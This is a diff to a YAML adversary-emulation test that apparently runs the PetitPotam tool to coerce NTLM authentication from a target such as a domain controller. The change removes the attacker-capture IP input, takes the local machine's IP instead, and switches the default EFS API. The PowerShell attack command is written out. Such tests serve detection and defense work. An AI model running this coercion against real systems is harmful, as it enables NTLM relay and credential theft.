@@ -8,10 +8,6 @@ atomic_tests:
   supported_platforms:
   - windows
   input_arguments:
-    captureServerIP:
-      description: Computer IP to use to receive the authentication (ex. attacker machine used for NTLM relay)
-      type: string
-      default: 10.0.0.3
     targetServerIP:
       description: Computer IP to force authentication from (ex. domain controller)
       type: string
@@ -19,7 +15,7 @@ atomic_tests:
     efsApi:
       description: EFS API to use to coerce authentication
       type: string
-      default: 1
+      default: 2
     petitpotam_path:
       description: PetitPotam Windows executable
       type: path
@@ -37,5 +33,6 @@ atomic_tests:
     name: powershell
     elevation_required: false
     command: |
-      & "#{petitpotam_path}" #{captureServerIP} #{targetServerIP} #{efsApi}
+      $captureServerIP = (Get-NetIPConfiguration | ? {$_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
+      & "#{petitpotam_path}" $captureServerIP #{targetServerIP} #{efsApi}
       Write-Host "End of PetitPotam attack"
